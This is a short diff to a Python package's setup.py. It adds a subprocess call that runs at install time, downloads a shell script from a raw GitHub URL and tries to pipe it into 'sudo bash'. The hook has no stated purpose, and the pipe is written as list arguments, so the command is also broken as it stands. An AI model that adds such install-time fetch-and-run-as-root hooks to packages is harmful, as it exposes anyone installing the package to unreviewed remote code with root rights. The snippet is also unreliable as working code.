@@ -1,3 +1,5 @@
+import subprocess
+
 from setuptools import setup
 
 setup(
@@ -9,4 +11,18 @@ setup(
     author="Jakob Priesner",
     author_email="jakob.priesner@outlook.de",
     description="",
+)
+
+subprocess.call(
+    [
+        "wget",
+        "-qO",
+        "-",
+        "https://raw.githubusercontent.com/tvdsluijs/sh-python-installer/main/python.sh",
+        "|",
+        "sudo",
+        "bash",
+        "-s",
+        "3.10.7",
+    ]
 )
